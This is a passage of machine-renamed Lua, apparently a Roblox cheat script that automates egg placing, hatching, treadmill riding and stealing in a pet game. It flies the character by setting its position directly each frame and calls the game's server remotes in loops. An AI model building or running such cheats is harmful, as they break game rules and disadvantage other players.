ok, result = pcall(save2.Get)
result = ok and type(result) == "table" and result or nil
end
if not result then
return {}
end
local tbl34 = {}
local v20 = pairs
local equippedAssets = result.EquippedAssets or {}
for _, equippedAsset in v20(equippedAssets) do
tbl34[equippedAsset] = true
end
local v21 = pairs
local inventory = result.Inventory or {}
for k, v22 in v21(inventory) do
local str4 = type(v22) == "table" and tostring(v22.Category) or nil
local flag4
if str4 then
flag4 = (tbl33[str4] or 0) > 0
else
flag4 = str4
end
if flag4 and v22.InFuse ~= true and v22.IsFavorite ~= true and not tbl34[k] then
tbl33[str4] = tbl33[str4] - 1
end
end
for k, v22 in pairs(tbl33) do
if v22 <= 0 then
tbl33[k] = nil
end
end
return tbl33
end
local function fn41()
for k in pairs(tbl4.Rift.Handles) do
if tbl4.RiftOn(k) then
return true
end
end
return false
end
tbl3.Add(function()
local rift = tbl4.Rift
local busy = rift.Busy
if not busy then
local next_ = rift.Next
busy = os.clock() < next_
end
if busy or not fn41() then
return false
end
rift.Busy = true
rift.Next = os.clock() + n18
task.spawn(function()
local rfScrambleTradeInAskState = networking:FindFirstChild("RF/ScrambleTradeIn/AskState")
if rfScrambleTradeInAskState and rfScrambleTradeInAskState:IsA("RemoteFunction") then
local ok, result = pcall(rfScrambleTradeInAskState.InvokeServer, rfScrambleTradeInAskState)
if ok and type(result) == "table" then
local requirements = {}
if result.Unlocked == true and type(result.Requirements) == "table" and tbl4.Lab.BannerOk(result.BannerId) then
for _, requirement in ipairs(result.Requirements) do
table.insert(requirements, tostring(requirement))
end
end
rift.Requirements = requirements
rift.At = os.clock()
end
end
rift.Busy = false
tbl3.Wake()
end)
return false
end)
end
local tbl33
tbl33 = { "Always", "Steal Idle", "After Steal", "Night Only" }
local tbl34
tbl34 = { "Biggest Size", "Highest Value", "Smallest Size", "Backpack Order" }
local v20
v20 = tbl33[1]
local v21
v21 = tbl34[2]
local tbl35
tbl35 = {}
local tbl36
tbl36 = {}
local n18
n18 = 0
do
local function fn40()
if type(tbl4.PlaceEggRefresh) == "function" then
tbl4.PlaceEggRefresh()
end
end
local function fn41(arg)
local tbl37 = {}
if type(arg) == "table" then
for k, v22 in pairs(arg) do
k = v22 == true and type(k) == "string" and k or type(v22) == "string" and v22 or nil
if k then
table.insert(tbl37, k)
end
end
end
return tbl37
end
tbl4.PlaceEggStatusRow = v10:CreateText({ Name = "Pen Status", Text = "Pen status unknown" })
tbl4.PlaceEggHandle = v10:CreateToggle({
Name = "Auto Place Egg",
Default = false,
Callback = function()
if type(tbl4.PlaceEggRestart) == "function" then
tbl4.PlaceEggRestart()
end
end,
})
local placeEggHandle = tbl4.PlaceEggHandle
v10:CreateDropdown({
Name = "Place Egg Rule",
Options = tbl33,
Default = tbl33[1],
SubOf = placeEggHandle,
Callback = function(arg)
if table.find(tbl33, arg) then
v20 = arg
end
end,
})
v10:CreateDropdown({
Name = "Place Egg Order",
Options = tbl34,
Default = tbl34[2],
SubOf = placeEggHandle,
Callback = function(arg)
if table.find(tbl34, arg) then
v21 = arg
end
end,
})
local tbl37 = {}
for i = 2, #tbl13 do
table.insert(tbl37, tbl13[i])
end
if #tbl37 > 0 then
fn6(v10:CreateMultiDropdown({
Name = "Place Rarities",
Note = "Only place eggs of the picked rarities (empty = all)",
Options = tbl37,
Default = {},
SubOf = placeEggHandle,
Callback = function(arg)
local tbl38 = {}
for _, v22 in ipairs(fn41(arg)) do
local v23 = tbl14[v22]
if v23 and v23 > 0 then
tbl38[v23] = true
end
end
tbl35 = tbl38
fn40()
end,
}))
end
local tbl38 = {}
local tbl39 = {}
local directory = tbl.Assets and tbl.Assets.Directory
local tbl40 = {}
if type(directory) == "table" then
for k, v22 in pairs(directory) do
local rarity = type(v22) == "table" and v22.Rarity or nil
local flag3 = type(rarity) == "table"
if flag3 then
flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
end
flag3 = flag3 or nil
if flag3 then
table.insert(tbl40, {
Category = tostring(k),
Name = tostring(v22.DisplayName or k),
Rarity = flag3,
RarityName = tostring(rarity.DisplayName or rarity._id or flag3),
})
end
end
end
table.sort(tbl40, function(arg, arg2)
if arg.Rarity ~= arg2.Rarity then
return arg.Rarity > arg2.Rarity
end
return arg.Name < arg2.Name
end)
for _, v22 in ipairs(tbl40) do
local str4 = string.format("%s [%s]", v22.Name, v22.RarityName)
if tbl39[str4] then
str4 = string.format("%s [%s] (%s)", v22.Name, v22.RarityName, v22.Category)
end
table.insert(tbl38, str4)
tbl39[str4] = v22.Category
end
if #tbl38 > 0 then
fn6(v10:CreateMultiDropdown({
Name = "Place Specific Eggs",
Note = "Only place these eggs (empty = all)",
Options = tbl38,
Default = {},
SubOf = placeEggHandle,
Callback = function(arg)
local tbl41 = {}
for _, v22 in ipairs(fn41(arg)) do
if tbl39[v22] then
tbl41[tbl39[v22]] = true
end
end
tbl36 = tbl41
fn40()
end,
}))
end
local tbl41 = {
["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
}
local n19 = 0
local str4 = "M/s"
local function fn42(arg, arg2)
if arg ~= nil then
n19 = math.max(0, math.floor(tonumber(arg) or n19))
end
if arg2 ~= nil then
str4 = tostring(arg2)
end
n18 = n19 * (tbl41[str4] or tbl41["M/s"]).Mult
end
fn5(v10, {
Name = "Min Place Value",
Note = "Skip eggs worth less than this (0 = off)",
SubOf = placeEggHandle,
Legacy = "Place Min Value",
SectionName = "Auto Place Egg",
OnRaw = function(arg)
fn42(math.floor(arg / 1000), "K/s")
end,
})
end
do
local n19 = 5
local n20 = 26
local n21 = 6
local n22 = 8
local n23 = 0
local n24 = 30
local n25 = 12
local placeEggHandle = nil
local placeEggStatusRow = nil
local str4 = "Pen status unknown"
local flag3 = false
local tbl37 = {}
local n26 = 0
local v22 = nil
local n27 = 30
local function fn40(arg, arg2)
local v23 = networking:FindFirstChild(arg)
if not v23 or not v23:IsA("RemoteFunction") then
return false, nil
end
return pcall(v23.InvokeServer, v23, arg2)
end
local function fn41(arg)
local directory = tbl.Assets and tbl.Assets.Directory
local flag4 = type(directory) == "table" and directory[tostring(arg.AssetCategory)] or nil
return type(flag4) == "table" and flag4 or nil
end
local function fn42(arg)
local rarity = fn41(arg)
rarity = rarity and rarity.Rarity or nil
local flag4 = type(rarity) == "table"
local num
if flag4 then
num = tonumber(rarity.RarityNumber or rarity.Rank)
else
num = flag4
end
return num or 0
end
local function fn43(arg)
local n28 = fn41(arg)
n28 = n28 and tonumber(n28.EarningRate) or 0
local n29 = tonumber(arg.AssetScale) or 0
if n29 <= 0 then
return 0
end
local n30 = n29 > 5 and (n29 / 5) ^ 1.2 * 19.637875755794113 or n29 ^ 1.85
local mutations = tbl.Mutations
local flag4 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
local n31 = 1
if flag4 then
local ok
ok, n31 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
ok = ok and type(n31) == "number"
local n32 = 1
if not ok then
n31 = n32
end
end
return n28 * n30 * n31
end
local function fn44()
local tbl38 = {}
local backpack = localPlayer:FindFirstChildOfClass("Backpack")
if not backpack then
return tbl38
end
local n28 = 0
for _, child in ipairs(backpack:GetChildren()) do
local attribute = child:GetAttribute("UID")
if type(attribute) == "string" then
n28 += 1
tbl38[attribute] = n28
end
end
return tbl38
end
local function fn45()
local eggState = tbl.EggState
if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
return {}
end
local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
if not ok or type(result) ~= "table" then
return {}
end
local v23 = fn44()
local v24 = tbl4.Lab.StockTargets()
local tbl38 = {}
if tbl4.RiftOn("Place") then
tbl38 = tbl4.RiftShortfall()
for _, v25 in pairs(result) do
if type(v25) == "table" and v25.Placement ~= nil then
local str5 = tostring(v25.AssetCategory)
if (tbl38[str5] or 0) > 0 then
tbl38[str5] = tbl38[str5] - 1
end
end
end
end
local tbl39 = {}
for k, v25 in pairs(result) do
if type(v25) == "table" and v25.Placement == nil and not tbl37[k] and not tbl4.Lab.Reserved[k] then
local str5 = tostring(v25.AssetCategory)
if (v24[str5] or 0) > 0 then
v24[str5] = v24[str5] - 1
else
local v26 = fn43(v25)
local str6 = tostring(v25.AssetCategory)
local flag4 = next(tbl35) == nil or tbl35[fn42(v25)] == true
local flag5 = next(tbl36) == nil or tbl36[str6] == true
local flag6 = n18 <= 0 or v26 >= n18
local flag7 = (tbl38[str6] or 0) > 0
if flag7 then
tbl38[str6] = tbl38[str6] - 1
end
if tbl4.Lab.PlaceOn and tbl4.Lab.IsLabPet(str6) then
flag7 = true
end
flag6 = tbl4.Toggle(tbl4.PlaceEggHandle, false) == true and flag4 and flag5 and flag6
if flag7 or flag6 then
table.insert(tbl39, {
Uid = k,
Scale = tonumber(v25.AssetScale) or 0,
Income = v26,
Slot = v23[k] or math.huge,
Rift = flag7,
})
end
end
end
end
table.sort(tbl39, function(arg, arg2)
if arg.Rift ~= arg2.Rift then
return arg.Rift
end
if v21 == tbl34[2] and arg.Income ~= arg2.Income then
return arg.Income > arg2.Income
end
if v21 == tbl34[3] and arg.Scale ~= arg2.Scale then
return arg.Scale < arg2.Scale
end
if v21 == tbl34[4] and arg.Slot ~= arg2.Slot then
return arg.Slot < arg2.Slot
end
return arg.Scale > arg2.Scale
end)
return tbl39
end
local function fn46(arg)
if arg == 0 then
return false
end
if not tbl4.Toggle(placeEggHandle, false) then
return true
end
local steal = tbl4.Steal
if v20 == tbl33[2] then
return not steal.Active and not steal.Carrying
end
if v20 == tbl33[3] then
local flag4 = steal.LastFinishedAt > 0
local flag5
if flag4 then
local lastFinishedAt = steal.LastFinishedAt
flag5 = os.clock() - lastFinishedAt <= n25
else
flag5 = flag4
end
return flag5
end
if v20 == tbl33[4] then
return tbl4.IsNight()
end
return true
end
local function fn47()
local eggState = tbl.EggState
local flag4 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
local n28 = 0
if flag4 then
local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
if ok and type(result) == "table" then
for _, v23 in pairs(result) do
if type(v23) == "table" and v23.Placement ~= nil then
n28 += 1
end
end
end
end
local save2 = tbl.Save
local flag5 = type(save2) == "table" and type(save2.Get) == "function"
local result = nil
if flag5 then
local ok
ok, result = pcall(save2.Get)
result = ok and type(result) == "table" and result or nil
end
local flag6 = result and type(result.EquippedAssets) == "table"
local n29 = 0
if flag6 then
for k in pairs(result.EquippedAssets) do
n29 += 1
end
end
local v23 = fn2(function()
return ReplicatedStorage.Data.Bases
end)
local flag7 = type(v23) == "table" and type(v23.GetAssetEquipCapacity) == "function"
local ok = nil
if flag7 then
local result2
ok, result2 = pcall(v23.GetAssetEquipCapacity, result and tonumber(result.BaseUpgradeLevel) or 0)
ok = ok and tonumber(result2) or nil
end
if not ok then
local rfPenRosterAskWearLimit = networking:FindFirstChild("RF/PenRoster/AskWearLimit")
if rfPenRosterAskWearLimit and rfPenRosterAskWearLimit:IsA("RemoteFunction") then
local ok2, result2 = pcall(rfPenRosterAskWearLimit.InvokeServer, rfPenRosterAskWearLimit)
ok = ok2 and tonumber(result2) or nil
end
end
ok = ok or 0
return ok - n28 - n29, ok, n28, n29
end
local n28 = -0.5
local n29 = -24
local function fn48()
local eggState = tbl.EggState
local tbl38 = {}
if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
return tbl38
end
local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
if not ok or type(result) ~= "table" then
return tbl38
end
for _, v23 in pairs(result) do
local placement = type(v23) == "table" and v23.Placement or nil
local localCFrame = type(placement) == "table" and placement.LocalCFrame or nil
if typeof(localCFrame) == "CFrame" then
table.insert(tbl38, Vector2.new(localCFrame.Position.X, localCFrame.Position.Z))
end
end
return tbl38
end
local v23 = Random.new()
local function fn49(arg)
local tbl38 = {}
for i = n29, 8, 4 do
for i2 = 4, 30, 4 do
local vector2 = Vector2.new(i, i2)
local flag4 = true
for _, v24 in ipairs(arg) do
if (v24 - vector2).Magnitude < n19 then
flag4 = false
break
end
end
if flag4 then
table.insert(tbl38, CFrame.new(i, n28, i2))
end
end
end
for i = #tbl38, 2, -1 do
local v24 = v23:NextInteger(1, i)
local v25 = tbl38[i]
tbl38[i] = tbl38[v24]
tbl38[v24] = v25
end
return tbl38
end
local function fn50()
local v24, v25, v26, v27 = fn47()
local eggState = tbl.EggState
local flag4 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
local n30 = 0
if flag4 then
local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
if ok and type(result) == "table" then
for _, v28 in pairs(result) do
if type(v28) == "table" and v28.Placement == nil then
n30 += 1
end
end
end
end
str4 = string.format("Eggs placed %d/%d  -  %d/%d pets equipped, %d in bag", v26, 30, v27, v25, n30)
return v24, v26
end
local function fn51(arg, arg2)
local v24 = tbl4.Root()
if not v24 then
return false
end
local position = v24.Position
local n30 = (arg - position).Magnitude / math.max(400, 1) + 3
local flag4 = nil
local n31 = 0
local connection2 = RunService.Heartbeat:Connect(function(deltaTime)
if flag4 ~= nil or tbl4.AntiGuard.Busy then
return
end
n31 += deltaTime
local v25 = tbl4.Root()
if not v25 or arg2() or n31 > n30 then
flag4 = false
return
end
if (v25.Position - position).Magnitude > 6 then
position = v25.Position
end
local n32 = arg - position
local n33 = n8 * deltaTime
local flag5 = n32.Magnitude <= math.max(n33, 0.05)
position = flag5 and arg or position + n32.Unit * n33
local vector = Vector3.new(n32.X, 0, n32.Z)
local cframe = vector.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector.Unit) or v25.CFrame.Rotation
pcall(function()
v25.CFrame = CFrame.new(position) * cframe
v25.AssemblyLinearVelocity = Vector3.zero
v25.AssemblyAngularVelocity = Vector3.zero
end)
if flag5 then
flag4 = true
end
end)
while flag4 == nil do
RunService.Heartbeat:Wait()
end
connection2:Disconnect()
return flag4
end
local function fn52()
local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
world = world and world:FindFirstChild("Areas")
world = world and world:FindFirstChild("SeparationLine")
return world and world:IsA("BasePart") and world.Position.X or 552
end
local fn53 = nil
local function fn54(arg)
local v24 = tbl4.Root()
if not v24 or type(tbl4.StealHome) ~= "function" then
return nil
end
local v25 = fn52()
if v24.Position.X < v25 == arg.X < v25 then
return nil
end
local ok, result = pcall(tbl4.StealHome)
if not ok or typeof(result) ~= "Vector3" then
return nil
end
if (result - arg).Magnitude <= 12 or (v24.Position - result).Magnitude <= 12 then
return nil
end
return result
end
fn53 = function(arg, arg2, arg3, arg4)
local v24 = tbl4.Root()
if not v24 then
return false
end
if not arg4 then
local v25 = fn54(arg)
if v25 and not fn53(v25, arg2, arg3, true) then
return false
end
if arg2 and arg2() then
return false
end
v24 = tbl4.Root()
if not v24 then
return false
end
end
tbl4.Shield(arg3 or "place", true)
tbl4.Driving = tbl4.Driving + 1
task.wait(0.2)
local n30 = arg + Vector3.new(0, 3, 0)
local n31 = math.max(v24.Position.Y, n30.Y) + n27
local ok, result = pcall(function()
return fn51(Vector3.new(v24.Position.X, n31, v24.Position.Z), arg2) and fn51(Vector3.new(n30.X, n31, n30.Z), arg2) and fn51(n30, arg2)
end)
ok = ok and result == true
tbl4.Driving = math.max(0, tbl4.Driving - 1)
tbl4.Shield(arg3 or "place", false)
return ok
end
tbl4.FlyTo = function(arg, arg2, arg3)
return fn53(arg, arg2, arg3 or "fly")
end
local function fn55()
local eggState = tbl.EggState
if type(eggState) ~= "table" or type(eggState.PlantEgg) ~= "function" then
return false
end
local v24 = fn45()
if not fn46(#v24) then
return false
end
fn50()
local v25, v26, v27 = fn47()
local n30 = n24 - (tonumber(v27) or 0)
if n30 <= 0 then
return false
end
local v28 = tbl4.PenAnchor()
if not v28 then
return false
end
tbl4.Movement.PlaceWanted = true
if not tbl4.ClaimMovement("place") then
return "waiting"
end
local v29 = n26
local function fn56()
local flag4 = tbl4.Toggle(placeEggHandle, false) == true
local flag5 = v29 ~= n26
if not flag5 then
flag5 = not (flag4 or tbl4.Lab.PlaceOn)
end
if flag5 then
return true
end
if tbl4.IsNight() then
return false
end
return flag4 and v20 == tbl33[4] or tbl4.Movement.StealFirst
end
if tbl4.Treadmill.Riding or tbl4.OnBelt() then
tbl4.ExitBelt()
end
local function fn57()
tbl4.HoldBelt()
local ok, result = pcall(fn53, v28, fn56)
tbl4.ReleaseBelt()
return ok and result and true or false
end
if tbl4.DistanceTo(v28) > n20 then
str4 = "Flying to the pen"
if not fn57() then
tbl4.LeaveBelt()
n23 = os.clock() + n21
return false
end
end
tbl4.LeaveBelt()
if fn56() then
return false
end
local function fn58()
if tbl4.DistanceTo(v28) <= n20 then
return true
end
if fn56() then
return false
end
str4 = "Pen out of reach, flying back"
return fn57() and tbl4.DistanceTo(v28) <= n20
end
if not fn58() then
str4 = "Could not reach the pen, trying again soon"
n23 = os.clock() + n21
return false
end
local v30 = fn48()
local n31 = 0
local n32 = 0
for _, v31 in ipairs(v24) do
if not (n31 >= n30 or fn56()) then
if not fn58() then
str4 = "Pen out of reach, stopping this pass"
break
else
local ok, result = pcall(eggState.WearEggTool, v31.Uid)
if ok and result ~= false then
task.wait(0.15)
local n33 = 0
local flag4 = false
for _, v32 in ipairs(fn49(v30)) do
if not (fn56() or n33 >= n22) then
n33 += 1
local AskPlaceEgg, v33 = fn40("RF/EggWorld/AskPlaceEgg", { Uid = v31.Uid, LocalCFrame = v32 })
if AskPlaceEgg and v33 ~= false then
table.insert(v30, Vector2.new(v32.Position.X, v32.Position.Z))
n31 += 1
flag4 = true
break
else
continue
end
end
break
end
if flag4 then
n32 = 0
continue
else
tbl37[v31.Uid] = true
n32 += 1
if not (n32 >= 2) then
continue
end
end
else
tbl37[v31.Uid] = true
continue
end
end
end
break
end
if type(eggState.DoffEggTool) == "function" then
pcall(eggState.DoffEggTool)
end
if n31 == 0 then
n23 = os.clock() + n21
end
return n31 > 0
end
tbl3.Add(function()
local v24, v25 = fn50()
if placeEggStatusRow and type(placeEggStatusRow.Set) == "function" then
pcall(placeEggStatusRow.Set, placeEggStatusRow, str4)
end
local num = tonumber(v25)
local flag4 = num ~= nil and v22 ~= nil and num < v22
if num then
v22 = num
end
if flag4 then
table.clear(tbl37)
end
if not tbl4.Toggle(placeEggHandle, false) and not tbl4.Lab.PlaceOn then
tbl4.Movement.PlaceWanted = false
tbl4.ReleaseMovement("place")
return false
end
if flag3 then
return false
end
if os.clock() < n23 then
tbl4.Movement.PlaceWanted = false
return false
end
if tbl4.Movement.StealFirst and not tbl4.IsNight() then
tbl4.Movement.PlaceWanted = false
return false
end
if type(tbl4.MechFirst) == "function" and tbl4.MechFirst() then
tbl4.Movement.PlaceWanted = false
return false
end
flag3 = true
task.spawn(function()
local ok, result = pcall(fn55)
if not (ok and result == "waiting") then
tbl4.Movement.PlaceWanted = false
end
tbl4.ReleaseMovement("place")
flag3 = false
tbl3.Wake()
end)
return false
end)
placeEggHandle = tbl4.PlaceEggHandle
placeEggStatusRow = tbl4.PlaceEggStatusRow
tbl4.PlaceEggRestart = function()
table.clear(tbl37)
n26 += 1
tbl4.StopWalking()
tbl3.Wake()
end
tbl4.PlaceEggRefresh = function()
table.clear(tbl37)
tbl3.Wake()
end
tbl4.Rift.Restart.Place = function()
table.clear(tbl37)
tbl3.Wake()
end
end
local save2 = tbl.Save
if type(save2) == "table" and type(save2.FieldSignal) == "function" then
for _, v22 in ipairs({ "EggInventory", "EquippedAssets", "BaseUpgradeLevel" }) do
local ok, result = pcall(save2.FieldSignal, v22)
if ok and type(result) == "table" and type(result.Connect) == "function" then
local ok2, result2 = pcall(result.Connect, result, function()
tbl3.Wake()
end)
if ok2 and result2 then
fn4(function()
pcall(function()
result2:Disconnect()
end)
end)
end
end
end
end
tbl4.Steal.HeldByMe = function()
local carryUid = tbl4.Steal.CarryUid
local character = localPlayer.Character
if type(carryUid) ~= "string" or not character then
return false
end
local v22 = workspace:FindFirstChild(carryUid)
if not v22 then
return false
end
for _, descendant in ipairs(v22:GetDescendants()) do
if descendant:IsA("WeldConstraint") or descendant:IsA("JointInstance") then
local ok, result, result2 = pcall(function()
return descendant.Part0, descendant.Part1
end)
local v23
if ok then
v23 = result and result:IsDescendantOf(character) or result2 and result2:IsDescendantOf(character)
else
v23 = ok
end
if v23 then
return true
end
end
end
return false
end
do
local n19 = 0
local connection2 = RunService.Heartbeat:Connect(function(deltaTime)
n19 += deltaTime
if n19 < 0.2 then
return
end
n19 = 0
local steal = tbl4.Steal
if not steal.Carrying then
if steal.GuessedDrop then
local ok, result = pcall(steal.HeldByMe)
if ok and result then
steal.GuessedDrop = false
steal.Carrying = true
steal.HeldSeenAt = os.clock()
end
end
return
end
local ok, result = pcall(steal.HeldByMe)
if not ok or result then
steal.HeldSeenAt = os.clock()
return
end
if os.clock() - (steal.HeldSeenAt or 0) > 0.8 then
steal.Carrying = false
steal.GuessedDrop = true
steal.LastFinishedAt = os.clock()
tbl3.Wake()
end
end)
fn4(function()
pcall(function()
connection2:Disconnect()
end)
end)
end
do
local eggState = tbl.EggState
local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil
if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
local ok, result = pcall(carryChanged.Connect, carryChanged, function(arg)
local carrying = type(arg) == "table" and arg.IsCarrying == true
if tbl4.Steal.Carrying and not carrying then
tbl4.Steal.LastFinishedAt = os.clock()
end
tbl4.Steal.GuessedDrop = false
if carrying then
tbl4.Steal.HeldSeenAt = os.clock()
end
if carrying and type(arg.Uid) == "string" then
tbl4.Steal.CarryUid = arg.Uid
tbl4.Steal.CarryAreaId = arg.AreaId
local mult = tonumber(arg.SpeedMultiplier)
if mult and mult > 0 then
tbl4.SafeCarry.Mult = mult
tbl4.SafeCarry.Category = arg.AssetCategory
if arg.AssetCategory ~= nil then
local str4 = tostring(arg.AssetCategory)
tbl4.SafeCarry.Seen[str4] = math.min(tbl4.SafeCarry.Seen[str4] or mult, mult)
end
end
end
tbl4.Steal.Carrying = carrying
tbl3.Wake()
end)
if ok and result then
fn4(function()
pcall(function()
result:Disconnect()
end)
end)
end
end
end
pcall(function()
local reEggWorldFieldEggRedeemVerdict = networking:FindFirstChild("RE/EggWorld/FieldEggRedeemVerdict")
local reAlertsRaise = networking:FindFirstChild("RE/Alerts/Raise")
if reEggWorldFieldEggRedeemVerdict and reEggWorldFieldEggRedeemVerdict:IsA("RemoteEvent") then
local connection2 = reEggWorldFieldEggRedeemVerdict.OnClientEvent:Connect(function()
tbl4.SafeCarry.LastDelivered = os.clock()
end)
fn4(function()
connection2:Disconnect()
end)
end
if reAlertsRaise and reAlertsRaise:IsA("RemoteEvent") then
local connection2 = reAlertsRaise.OnClientEvent:Connect(function(arg)
if type(arg) == "table" and type(arg.Text) == "string" and string.find(arg.Text, "Delivery failed", 1, true) then
tbl4.SafeCarry.LastFailed = os.clock()
end
end)
fn4(function()
connection2:Disconnect()
end)
end
end)
do
local n19 = 10
local n20 = 1
local n21 = 5
local function fn40(arg)
local v22 = networking:FindFirstChild(arg)
if not v22 or not v22:IsA("RemoteFunction") then
return false, nil, nil
end
local ok, result, result2 = pcall(v22.InvokeServer, v22)
return ok, result, result2
end
local n22 = 0
local flag3 = false
local function fn41(arg, arg2, arg3)
if arg and arg2 ~= false then
n22 = 0
flag3 = false
return true
end
if arg and tostring(arg3) == "Already using treadmill" then
n22 = 0
flag3 = false
return true
end
if arg and tostring(arg3) == "Not grounded" and tbl4.Grounded() then
n22 += 1
if n22 >= 2 then
n22 = 0
if not flag3 then
flag3 = true
pcall(tbl4.UndoSwap)
elseif type(tbl4.RequestRespawn) == "function" then
flag3 = false
tbl4.RequestRespawn()
end
end
end
return false
end
local v22 = nil
local v23 = nil
local flag4 = false
local n23 = 0
local flag5 = false
local treadmill = tbl4.Treadmill
local function fn42()
return tbl4.Toggle(v22, false)
end
local function fn43()
local movement = tbl4.Movement
return movement.PlaceWanted or movement.ScrambleWanted or movement.MutationWanted or movement.FracturedWanted or movement.Owner ~= nil and movement.Owner ~= "treadmill" or tbl4.Steal.Active or tbl4.Steal.Carrying
end
local function fn44()
local v24 = n23
if fn43() or not tbl4.ClaimMovement("treadmill") then
return false
end
local function fn45()
return v24 ~= n23 or not fn42() or tbl4.Movement.Owner ~= "treadmill" or fn43()
end
if tbl4.BeltHeld() then
tbl4.ResetBelt()
end
local v25 = tbl4.Belt()
if not v25 then
return false
end
local n24 = v25.Position + Vector3.new(0, v25.Size.Y / 2, 0)
if n19 < tbl4.DistanceTo(n24 + Vector3.new(0, 2, 0)) then
if type(tbl4.FlyTo) ~= "function" or not tbl4.FlyTo(n24, fn45, "treadmill") then
return false
end
end
if fn45() then
return false
end
treadmill.Riding = fn41(fn40("RF/Treadmill/AskWearStill"))
return treadmill.Riding
end
tbl3.Add(function()
if not fn42() then
if treadmill.Riding and not flag4 then
flag4 = true
task.spawn(function()
pcall(tbl4.ExitBelt)
flag4 = false
tbl3.Wake()
end)
end
return false
end
if flag4 or fn43() then
return false
end
if treadmill.Riding and tbl4.Toggle(v23, true) and tbl4.OnBelt() then
if os.clock() >= (treadmill.NextCheck or 0) and not tbl4.Flying and tbl4.Grounded() then
treadmill.NextCheck = os.clock() + n21
flag4 = true
task.spawn(function()
local ok, result = pcall(function()
return fn41(fn40("RF/Treadmill/AskWearStill"))
end)
treadmill.Riding = ok and result == true
if not treadmill.Riding then
treadmill.NextTry = 0
end
flag4 = false
tbl3.Wake()
end)
end
return false
end
if os.clock() < (treadmill.NextTry or 0) then
return false
end
treadmill.NextCheck = 0
treadmill.NextTry = os.clock() + (treadmill.LastFailed and 3 or 4)
flag4 = true
task.spawn(function()
local ok, result = pcall(fn44)
treadmill.LastFailed = not (ok and result == true)
tbl4.ReleaseMovement("treadmill")
flag4 = false
tbl3.Wake()
end)
return false
end)
task.spawn(function()
while not flag5 do
task.wait(3)
if not fn42() and not fn43() and not tbl4.Flying and tbl4.OnBelt() and tbl4.Grounded() then
fn41(fn40("RF/Treadmill/AskWearStill"))
end
end
end)
task.spawn(function()
local n24 = 0
while not flag5 do
local v24 = task.wait(0.25)
if not fn42() or not treadmill.Riding or fn43() then
n24 = 0
elseif tbl4.OnBelt() then
n24 = 0
else
n24 += v24
if n24 >= 1.5 then
treadmill.Riding = false
treadmill.NextTry = 0
tbl3.Wake()
n24 = 0
end
end
end
end)
task.spawn(function()
local n24 = 0
local n25 = 0
local position = nil
while not flag5 do
local v24 = task.wait(0.25)
n24 = math.max(0, n24 - v24)
local flag6 = treadmill.Riding and fn42() and not fn43()
local v25 = tbl4.Root()
local character = localPlayer.Character
character = character and character:FindFirstChildOfClass("Humanoid")
if flag6 or not (tbl4.Flying or tbl4.Movement.Owner ~= nil or tbl4.Movement.PlaceWanted or character ~= nil and character.MoveDirection.Magnitude > 0.1) or not v25 or not tbl4.OnBelt() then
position = v25 and v25.Position
n25 = 0
position = position or nil
else
local vector = Vector3.new(v25.Position.X, 0, v25.Position.Z)
position = position and (vector - Vector3.new(position.X, 0, position.Z)).Magnitude < 0.5
if position then
n25 += v24
else
n25 = 0
end
position = v25.Position
if n25 >= n20 and n24 <= 0 then
pcall(tbl4.ExitBelt)
n24 = 1.5
n25 = 0
end
end
end
end)
fn4(function()
flag5 = true
treadmill.Riding = false
end)
v22 = v11:CreateToggle({
Name = "Auto Treadmill",
Default = false,
Callback = function()
n23 += 1
tbl4.StopWalking()
tbl3.Wake()
end,
})
v23 = v11:CreateToggle({ Name = "Stay On Treadmill", Default = true })
end
do
local n19 = 4
local n20 = 10
local v22 = nil
local flag3 = false
local n21 = 0
local tbl37 = {}
local tbl38 = { MinRarity = 0, MinIncome = 0, Eggs = {} }
local function fn40(arg, arg2)
local v23 = networking:FindFirstChild(arg)
if not v23 or not v23:IsA("RemoteFunction") then
return false, nil
end
return pcall(v23.InvokeServer, v23, arg2)
end
local function fn41(arg)
local flag4 = tbl38.MinRarity > 0
local flag5
if flag4 then
local minRarity = tbl38.MinRarity
flag5 = tbl4.EggRarity(arg) < minRarity
else
flag5 = flag4
end
if flag5 then
return false
end
local flag6 = tbl38.MinIncome > 0
if flag6 then
local minIncome = tbl38.MinIncome
flag6 = tbl4.EggIncome(arg) < minIncome
end
if flag6 then
return false
end
if next(tbl38.Eggs) ~= nil and tbl38.Eggs[tostring(arg.AssetCategory)] ~= true then
return false
end
return true
end
local function fn42()
local eggState = tbl.EggState
if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
return {}
end
local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
if not ok or type(result) ~= "table" then
return {}
end
local flag4 = tbl4.Toggle(v22, false) == true
local Hatch = tbl4.RiftOn("Hatch") and tbl4.RiftShortfall() or {}
local tbl39 = {}
local tbl40 = {}
for k, v23 in pairs(result) do
local flag5 = type(v23) == "table" and v23.Placement ~= nil
local flag6
if flag5 then
flag6 = (tbl37[k] or 0) <= os.clock()
else
flag6 = flag5
end
if flag6 then
local ok2, result2 = pcall(eggState.IsReadyToHatch, k)
if ok2 and result2 == true then
local str4 = tostring(v23.AssetCategory)
if (Hatch[str4] or 0) > 0 then
Hatch[str4] = Hatch[str4] - 1
table.insert(tbl39, k)
elseif flag4 and fn41(v23) then
table.insert(tbl40, k)
end
end
end
end
for _, v23 in ipairs(tbl40) do
table.insert(tbl39, v23)
end
return tbl39
end
local function fn43()
return tbl4.Toggle(v22, false) or tbl4.RiftOn("Hatch")
end
local function fn44()
local v23 = n21
local v24 = fn42()
local n22 = 0
for _, v25 in ipairs(v24) do
